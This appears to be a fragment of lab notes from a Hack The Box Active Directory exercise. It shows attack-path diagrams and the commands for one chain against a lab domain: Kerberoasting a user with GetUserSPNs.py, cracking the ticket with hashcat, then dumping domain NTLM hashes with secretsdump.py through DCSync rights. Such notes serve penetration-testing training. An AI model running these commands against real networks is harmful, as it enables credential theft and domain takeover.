...
![Diagram showing MSSQLADM@INLANEFREIGHT.LOCAL with execution and control rights, connected to TTIMMONS@INLANEFREIGHT.LOCAL via GenericWrite.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/ttimmons.png)
...
```shell-session
0xmid00@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
...
```shell-session
0xmid00@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
...
![Diagram showing TTIMMONS@INLANEFREIGHT.LOCAL with execution and control rights, connected to SERVER ADMINS@INLANEFREIGHT.LOCAL via GenericAll.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/ttimmons_server_admins.png)
...
![Diagram showing SERVER ADMINS@INLANEFREIGHT.LOCAL with execution and control rights, connected to INLANEFREIGHT.LOCAL via GetChanges and GetChangesAll.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/dcsync.png)
...
```shell-session
0xmid00@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
